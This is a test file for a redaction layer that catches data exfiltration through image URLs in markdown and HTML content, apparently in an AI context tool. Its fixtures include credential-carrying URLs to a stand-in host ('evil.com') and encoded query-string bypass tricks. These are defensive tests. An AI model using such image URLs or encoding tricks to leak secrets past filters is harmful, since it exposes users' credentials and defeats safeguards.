import { expect, test } from "bun:test";
import {
  buildFinding,
  egressSourceHasOverride,
  egressSourceOverrideAction,
  resolveDecision,
} from "./resolve";
import {
  computeConfigChecksum,
  DEFAULT_SECURITY_CONFIG,
  mergeSecurityConfig,
  verifyConfigChecksum,
} from "./config";
import { detectExfil } from "./detect/exfil";
import type { SecurityConfig } from "./types";

// GDCTX-2: `ctx read README.md --mode full` used to redact CI/npm/license badge
// `<img src>`/markdown-image URLs as `[REDACTED:url]` even though the file was
// read with `source: "trusted-project"` — `resolve.ts` selected a policy by
// category alone and never looked at `source`. These tests cover the fix at
// the `resolveDecision`/`buildFinding` level: the data-driven
// `policies.egress.sourceOverrides` table, the query-safety gate
// (`resolve.ts#queryIsSafeForTrustedOverride`) that keeps an attacker/model-
// controlled URL redacted even from a trusted file, and that a finding is
// still recorded (never silently skipped) when the resolved action becomes
// `allow`. R3-1 (flow 304, fix round 3) rewrote that gate from a
// credential-shaped-name DENYLIST (three review rounds running found gaps in
// it) to a small, explicit ALLOWLIST of known safe badge-rendering query
// parameters — most tests below still read the same (a credential-shaped
// name still keeps redaction), but for a different reason: it is simply not
// on the allowlist, not because it matched a denylist entry.

function exfilMatch(content: string) {
  const matches = detectExfil(content);
  expect(matches.length).toBe(1);
  return matches[0]!;
}

const HTML_BADGE = `<img src="https://github.com/o/r/actions/workflows/ci.yml/badge.svg">`;
const MARKDOWN_BADGE = `![npm](https://img.shields.io/npm/v/x.svg?style=flat)`;

test("trusted-project HTML badge URL: action allow, finding recorded, content unredacted", () => {
  const match = exfilMatch(HTML_BADGE);
  const config = DEFAULT_SECURITY_CONFIG;
  const finding = buildFinding(match, config, { source: "trusted-project", content: HTML_BADGE });
  expect(finding.action).toBe("allow");
  // Paper trail: the finding still exists (GDCTX-2 design §2, "no silent skip").
  expect(finding.policyId).toBe("egress.html-image-exfil");
  expect(finding.category).toBe("egress");

  const decision = resolveDecision(config, {
    matches: [match],
    source: "trusted-project",
    content: HTML_BADGE,
  });
  expect(decision.findings).toHaveLength(1);
  expect(decision.findings[0]?.action).toBe("allow");
  expect(decision.redacted).toBeUndefined();
});

test("trusted-project markdown badge URL: action allow, content unredacted", () => {
  const match = exfilMatch(MARKDOWN_BADGE);
  expect(match.policyId).toBe("egress.markdown-image-exfil");
  const config = DEFAULT_SECURITY_CONFIG;
  const decision = resolveDecision(config, {
    matches: [match],
    source: "trusted-project",
    content: MARKDOWN_BADGE,
  });
  expect(decision.findings[0]?.action).toBe("allow");
  expect(decision.redacted).toBeUndefined();
});

test("tool-output source: the override never applies, badge URL still redacted as before", () => {
  const match = exfilMatch(HTML_BADGE);
  const config = DEFAULT_SECURITY_CONFIG;
  const decision = resolveDecision(config, {
    matches: [match],
    source: "tool-output",
    content: HTML_BADGE,
  });
  expect(decision.findings[0]?.action).toBe("block");
  expect(decision.redacted).toBeDefined();
  expect(decision.redacted).toContain("[REDACTED:url]");
  expect(decision.redacted).not.toContain("badge.svg");
});

test("credential-shaped query param NAME keeps redaction even from trusted-project", () => {
  for (const query of ["?token=abc123", "?key=abc123", "?auth=abc123"]) {
    const content = `<img src="https://img.shields.io/npm/v/x.svg${query}">`;
    const matches = detectExfil(content);
    const urlMatch = matches.find((m) => m.policyId === "egress.html-image-exfil");
    expect(urlMatch).toBeDefined();
    const action = egressSourceOverrideAction(
      DEFAULT_SECURITY_CONFIG.policies.egress,
      urlMatch!,
      "trusted-project",
    );
    // undefined ⇒ caller falls back to the policy's own (redacting) action.
    expect(action).toBeUndefined();
  }
});

test("a harmless query string (?style=flat, ?branch=main) does not block the override", () => {
  const content = `<img src="https://img.shields.io/npm/v/x.svg?branch=main&style=flat">`;
  const match = detectExfil(content)[0]!;
  const action = egressSourceOverrideAction(
    DEFAULT_SECURITY_CONFIG.policies.egress,
    match,
    "trusted-project",
  );
  expect(action).toBe("allow");
});

// R2-5 (flow 304, fix round 2): the credential-name gate above missed a
// handful of real-world spellings entirely — `?APIToken=` (acronym+titlecase
// compound the old camelCase split never broke apart), `?XTOKEN=` (all-caps,
// no separator at all), `?apitoken=` (already-lowercase, no separator), and
// `?pw=hunter2` (a short exact name that was never listed). R3-1 (fix round
// 3) then replaced the whole denylist/segmenter with an ALLOWLIST of known
// safe badge parameters — none of these names are on it, so each still keeps
// redaction, but now because it is simply not a recognized name, not because
// it matched a credential shape.
test("credential-shaped query param NAME (round 2 spellings) keeps redaction even from trusted-project", () => {
  for (const query of ["?APIToken=abc123", "?XTOKEN=abc123", "?apitoken=abc123", "?pw=hunter2", "?sid=abc123"]) {
    const content = `<img src="https://img.shields.io/npm/v/x.svg${query}">`;
    const matches = detectExfil(content);
    const urlMatch = matches.find((m) => m.policyId === "egress.html-image-exfil");
    expect(urlMatch).toBeDefined();
    const action = egressSourceOverrideAction(
      DEFAULT_SECURITY_CONFIG.policies.egress,
      urlMatch!,
      "trusted-project",
    );
    expect(action).toBeUndefined();
  }
});

// R3-1 (flow 304, fix round 3): a third review round still found spellings a
// credential-name DENYLIST missed (`authorization`, `Authorization`,
// `privatekey`, `authkey`, `accesskeyid`, `accesskey_id`). None of these are
// safe badge parameters either, so the allowlist that replaced the denylist
// keeps redacting them too — for the same reason as any other unrecognized
// name, which is the point: there is no more enumerating to do.
test("credential-shaped query param NAME (round 3 spellings) keeps redaction even from trusted-project", () => {
  for (const query of [
    "?authorization=abc123",
    "?Authorization=abc123",
    "?privatekey=abc123",
    "?authkey=abc123",
    "?accesskeyid=abc123",
    "?accesskey_id=abc123",
  ]) {
    const content = `<img src="https://img.shields.io/npm/v/x.svg${query}">`;
    const urlMatch = detectExfil(content).find((m) => m.policyId === "egress.html-image-exfil");
    expect(urlMatch).toBeDefined();
    const action = egressSourceOverrideAction(
      DEFAULT_SECURITY_CONFIG.policies.egress,
      urlMatch!,
      "trusted-project",
    );
    expect(action).toBeUndefined();
  }
});

// R2-5: an unseparated compound built on a long, unambiguous stem — no
// camelCase, no delimiter for segmentation to split on at all — must still be
// caught. Under R3-1's allowlist this needs no segmenter at all: none of
// these names are a recognized safe badge parameter, full stop.
test("an unseparated credential-shaped compound (suffix/prefix) keeps redaction", () => {
  for (const query of ["?oldpassword=hunter2", "?userapikey=abc123", "?mytoken=abc123"]) {
    const content = `<img src="https://img.shields.io/npm/v/x.svg${query}">`;
    const urlMatch = detectExfil(content).find((m) => m.policyId === "egress.html-image-exfil");
    expect(urlMatch).toBeDefined();
    const action = egressSourceOverrideAction(
      DEFAULT_SECURITY_CONFIG.policies.egress,
      urlMatch!,
      "trusted-project",
    );
    expect(action).toBeUndefined();
  }
});

// R3-1: the known SAFE badge-rendering parameters (shields.io, GitHub
// Actions workflow badges, …) — the ones the design doc's own examples and
// this repo's own README badges rely on — must still resolve to `allow`.
// Compared case-insensitively.
test("known safe badge query params still allow", () => {
  for (const query of [
    "?style=flat",
    "?logo=npm",
    "?label=build",
    "?color=blue",
    "?branch=main",
    "?Style=FLAT",
    "?event=push",
    "?cacheSeconds=3600",
    "?v=3",
  ]) {
    const content = `<img src="https://img.shields.io/npm/v/x.svg${query}">`;
    const urlMatch = detectExfil(content).find((m) => m.policyId === "egress.html-image-exfil");
    expect(urlMatch).toBeDefined();
    const action = egressSourceOverrideAction(
      DEFAULT_SECURITY_CONFIG.policies.egress,
      urlMatch!,
      "trusted-project",
    );
    expect(action).toBe("allow");
  }
});

// R3-1: an ordinary word that is not itself a recognized badge parameter is
// no longer treated as automatically safe just because it fails to LOOK
// credential-shaped — the allowlist is deliberately the opposite of a
// denylist. `areacode`/`monkey`/`barcode` were false-positive CONTROLS for
// the old segment/stem/affix denylist (proving it did not over-match); under
// the allowlist they are simply unrecognized names, so the override no
// longer applies to them either. This is an intentional narrowing, not a
// regression: nothing observed in this repo's own badges or the design doc's
// examples uses a parameter outside `SAFE_BADGE_QUERY_PARAMS`.
test("R3-1: an arbitrary unrecognized param name no longer gets the override, even though it is not credential-shaped", () => {
  for (const query of ["?areacode=555", "?monkey=1", "?barcode=123", "?note=hello"]) {
    const content = `<img src="https://img.shields.io/npm/v/x.svg${query}">`;
    const urlMatch = detectExfil(content).find((m) => m.policyId === "egress.html-image-exfil");
    expect(urlMatch).toBeDefined();
    const action = egressSourceOverrideAction(
      DEFAULT_SECURITY_CONFIG.policies.egress,
      urlMatch!,
      "trusted-project",
    );
    expect(action).toBeUndefined();
  }
});

// R3-1: a SAFE-named parameter can still carry a credential in its VALUE — the
// value-based secret/PII check applies regardless of how the names checked
// out, unchanged from the denylist version of this gate.
test("R3-1: a safe-named param carrying a detector-flagged secret value still keeps redaction", () => {
  const content = `<img src="https://example.com/x.svg?color=AKIAIOSFODNN7EXAMPLE">`;
  const match = detectExfil(content)[0]!;
  const action = egressSourceOverrideAction(
    DEFAULT_SECURITY_CONFIG.policies.egress,
    match,
    "trusted-project",
  );
  expect(action).toBeUndefined();
});

// R3-1: userinfo in the URL itself (`user:pass@host`) must fail closed even
// with no query string at all — a denylist over query PARAMETER NAMES never
// looked at the authority component, so a credential smuggled there sailed
// through unexamined.
test("R3-1: userinfo in the URL fails closed even with no query string", () => {
  const content = `<img src="https://user:hunter2@img.shields.io/npm/v/x.svg">`;
  const match = detectExfil(content)[0]!;
  const action = egressSourceOverrideAction(
    DEFAULT_SECURITY_CONFIG.policies.egress,
    match,
    "trusted-project",
  );
  expect(action).toBeUndefined();
});

// R3-1: an empty query parameter name is malformed enough to fail closed
// rather than guess at what it names, even alongside otherwise-safe names.
test("R3-1: an empty query parameter name fails closed", () => {
  const content = `<img src="https://img.shields.io/npm/v/x.svg?style=flat&=abc123">`;
  const match = detectExfil(content)[0]!;
  const action = egressSourceOverrideAction(
    DEFAULT_SECURITY_CONFIG.policies.egress,
    match,
    "trusted-project",
  );
  expect(action).toBeUndefined();
});

// R3V-1 (flow 304, fix round 3, review round 3): `queryIsSafeForTrustedOverride`
// used to parse userinfo with a bare `new URL(renderable)`, which throws for
// any relative destination — including a PROTOCOL-RELATIVE one, which a
// renderer fetches exactly like an absolute URL and which DOES carry userinfo
// — and the catch treated that throw as "no userinfo is possible", so
// `//user:pass@evil.com/a.png` read as query-free and fell through to
// `allow`. The fix resolves against a fixed dummy base instead, which exposes
// userinfo on a protocol-relative destination the same way a browser would.
test("R3V-1: protocol-relative URL with userinfo fails closed (//user:pass@host)", () => {
  const content = `![b](//user:pass@evil.com/a.png)`;
  const match = exfilMatch(content);
  const action = egressSourceOverrideAction(
    DEFAULT_SECURITY_CONFIG.policies.egress,
    match,
    "trusted-project",
  );
  expect(action).toBeUndefined();
});

test("R3V-1: protocol-relative URL with a bare username fails closed (//token@host)", () => {
  const content = `![b](//token@evil.com/a.png)`;
  const match = exfilMatch(content);
  const action = egressSourceOverrideAction(
    DEFAULT_SECURITY_CONFIG.policies.egress,
    match,
    "trusted-project",
  );
  expect(action).toBeUndefined();
});

test("R3V-1: protocol-relative URL with an empty username, non-empty password fails closed (//:pass@host)", () => {
  const content = `![b](//:pass@evil.com/a.png)`;
  const match = exfilMatch(content);
  const action = egressSourceOverrideAction(
    DEFAULT_SECURITY_CONFIG.policies.egress,
    match,
    "trusted-project",
  );
  expect(action).toBeUndefined();
});

test("R3V-1: protocol-relative badge URL with no userinfo still allows (//img.shields.io/badge/x.svg?style=flat)", () => {
  const content = `![b](//img.shields.io/badge/x.svg?style=flat)`;
  const match = exfilMatch(content);
  const action = egressSourceOverrideAction(
    DEFAULT_SECURITY_CONFIG.policies.egress,
    match,
    "trusted-project",
  );
  expect(action).toBe("allow");
});

// A relative destination (no host of its own, so `detectExfil` never even
// produces a match for it) must stay unaffected by resolving against the
// dummy base: it has no userinfo to carry either way.
test("R3V-1: a relative destination is unaffected (./docs/logo.png)", () => {
  const content = `![b](./docs/logo.png)`;
  const matches = detectExfil(content);
  expect(matches).toHaveLength(0);
});

test("mergeSecurityConfig: the shipped default is NOT materialized into policies.egress.sourceOverrides (F1)", () => {
  // F1 (review round 1): the shipped default used to be copied into every
  // merged config's `policies.egress.sourceOverrides`, which is exactly the
  // block `configChecksum` hashes (`computeConfigChecksum`) — so a config file
  // rendered before GDCTX-2 existed, whose checksum was computed over a
  // `policies.egress` with no `sourceOverrides` key at all, started reading as
  // TAMPERED. The shipped default must stay OUT of the merged/checksummed
  // config; it is applied at resolution time instead (see the
  // `egressSourceOverrideAction` tests below, which prove it still applies).
  const config = mergeSecurityConfig({});
  expect(config.policies.egress.sourceOverrides).toBeUndefined();
});

test("F1: a config checksummed the PRE-GDCTX-2 way (no sourceOverrides key) still verifies", () => {
  // Simulates a `security.config.json` written before this feature shipped:
  // `computeConfigChecksum` hashed `policies` with no `sourceOverrides` entry
  // at all. Loading it through today's merge must reproduce the SAME checksum,
  // or every pre-existing config in the wild reads as tampered the moment this
  // build runs `security status` / `security policy validate` against it.
  const config = mergeSecurityConfig({});
  const oldChecksum = computeConfigChecksum(config);
  const rendered: SecurityConfig = { ...config, configChecksum: oldChecksum };
  const reloaded = mergeSecurityConfig(rendered);
  expect(verifyConfigChecksum(reloaded).match).toBe(true);

  // And the shipped override still applies to a fresh (never configured)
  // workspace's resolution — the fix moves WHERE the default lives, not
  // whether it takes effect.
  const match = exfilMatch(HTML_BADGE);
  const action = egressSourceOverrideAction(reloaded.policies.egress, match, "trusted-project");
  expect(action).toBe("allow");
});

test("a project can disable the override through its own security config", () => {
  const config: SecurityConfig = mergeSecurityConfig({
    policies: {
      ...DEFAULT_SECURITY_CONFIG.policies,
      egress: {
        enabled: true,
        action: "block",
        sourceOverrides: {
          "egress.html-image-exfil": { "trusted-project": "redact" },
        },
      },
    },
  });
  // F1: only what the operator actually wrote is stored/checksummed — the
  // shipped default for the OTHER policyId is not copied in here at all.
  expect(config.policies.egress.sourceOverrides).toEqual({
    "egress.html-image-exfil": { "trusted-project": "redact" },
  });

  // The operator's own entry wins at resolution time; the untouched policyId
  // still resolves through the shipped default (merged in by
  // `egressSourceOverrideAction`, not stored on `config`).
  const markdownMatch = exfilMatch(MARKDOWN_BADGE);
  expect(
    egressSourceOverrideAction(config.policies.egress, markdownMatch, "trusted-project"),
  ).toBe("allow");

  const match = exfilMatch(HTML_BADGE);
  const decision = resolveDecision(config, {
    matches: [match],
    source: "trusted-project",
    content: HTML_BADGE,
  });
  expect(decision.findings[0]?.action).toBe("redact");
  expect(decision.redacted).toBeDefined();
  expect(decision.redacted).toContain("[REDACTED:url]");
});

test("an action other than allow is never gated on the query string", () => {
  // A project tightening its own policy (source override to something other
  // than `allow`) is not a widening of what is released, so it is never
  // subject to the credential-query gate — only `allow` is.
  const config: SecurityConfig = mergeSecurityConfig({
    policies: {
      ...DEFAULT_SECURITY_CONFIG.policies,
      egress: {
        enabled: true,
        action: "block",
        sourceOverrides: {
          "egress.html-image-exfil": { "tool-output": "warn" },
        },
      },
    },
  });
  const match = exfilMatch(HTML_BADGE);
  const action = egressSourceOverrideAction(config.policies.egress, match, "tool-output");
  expect(action).toBe("warn");
});

// F2 (review round 1): `queryIsSafeForTrustedOverride` (named
// `hasCredentialShapedQuery` before R3-1's allowlist rewrite) used to parse
// the RAW `match.value` span while `detectExfil`/a real renderer classify and
// fetch the DECODED destination (`exfil.ts#renderableUrl`). Every case below
// is a query string that reads as query-free (or as only recognized-safe
// names) to a naive raw-bytes parse but decodes/splits to an unrecognized (or,
// under the old denylist, credential-shaped) one — each was a confirmed
// bypass that returned `allow` before the F2 fix. All must keep the policy's
// stricter (redacting) action, i.e. `egressSourceOverrideAction` returns
// `undefined`.
const EGRESS_POLICY = DEFAULT_SECURITY_CONFIG.policies.egress;

function overrideActionFor(content: string): ReturnType<typeof egressSourceOverrideAction> {
  const match = exfilMatch(content);
  return egressSourceOverrideAction(EGRESS_POLICY, match, "trusted-project");
}

test("F2 bypass: double-encoded &amp;amp; before a credential-shaped param name", () => {
  const content = `<img src="https://img.shields.io/npm/v/x.svg?a=1&amp;amp;token=abc123">`;
  expect(overrideActionFor(content)).toBeUndefined();
});

test("F2 bypass: numeric character reference spells the param name (&amp;#116;oken)", () => {
  const content = `<img src="https://img.shields.io/npm/v/x.svg?&amp;#116;oken=abc123">`;
  expect(overrideActionFor(content)).toBeUndefined();
});

test("F2 bypass: numeric character reference inside a markdown image URL (t&amp;#111;ken)", () => {
  const content = `![npm](https://img.shields.io/npm/v/x.svg?t&amp;#111;ken=abc123)`;
  expect(overrideActionFor(content)).toBeUndefined();
});

test("F2 bypass: a `;`-separated query pair (not just `&`)", () => {
  const content = `<img src="https://img.shields.io/npm/v/x.svg?a=1;token=abc123">`;
  expect(overrideActionFor(content)).toBeUndefined();
});

test("F2 bypass: a credential stem compounded with an unrelated word (x_token)", () => {
  const content = `<img src="https://img.shields.io/npm/v/x.svg?x_token=abc123">`;
  expect(overrideActionFor(content)).toBeUndefined();
});

test("F2 bypass: a credential stem compounded with unrelated words (access_key_id)", () => {
  const content = `<img src="https://img.shields.io/npm/v/x.svg?access_key_id=abc123">`;
  expect(overrideActionFor(content)).toBeUndefined();
});

test("F2 bypass: an OAuth-shaped `code` param name", () => {
  const content = `<img src="https://img.shields.io/npm/v/x.svg?code=abc123">`;
  expect(overrideActionFor(content)).toBeUndefined();
});

// F2's control used to prove `barcode`/`areacode` were NOT false positives
// for the old segment/stem denylist (they merely contain a stem's letters
// with no word boundary). R3-1's allowlist has no such false-positive class
// to guard against — an unrecognized name is simply unrecognized — so this
// now documents the (intentional) narrowing instead: see "R3-1: an arbitrary
// unrecognized param name…" above, which covers the same two names and
// expects `undefined`, not `allow`.

// F10 (review round 1): `egressSourceHasOverride` is what `guard.ts#redactRaw`
// now consults to skip its second, config-aware detection pass. It must read
// `true` for the shipped default (even with no explicit config) and for a
// source the operator's own config names, and `false` for a source neither
// table mentions.
test("F10: egressSourceHasOverride reflects the shipped default with no config at all", () => {
  expect(egressSourceHasOverride(DEFAULT_SECURITY_CONFIG.policies.egress, "trusted-project")).toBe(
    true,
  );
  expect(egressSourceHasOverride(DEFAULT_SECURITY_CONFIG.policies.egress, "tool-output")).toBe(
    false,
  );
});

test("F10: egressSourceHasOverride reflects an operator's own explicit override", () => {
  const config: SecurityConfig = mergeSecurityConfig({
    policies: {
      ...DEFAULT_SECURITY_CONFIG.policies,
      egress: {
        enabled: true,
        action: "block",
        sourceOverrides: {
          "egress.html-image-exfil": { "tool-output": "warn" },
        },
      },
    },
  });
  expect(egressSourceHasOverride(config.policies.egress, "tool-output")).toBe(true);
  expect(egressSourceHasOverride(config.policies.egress, "untrusted-external")).toBe(false);
});
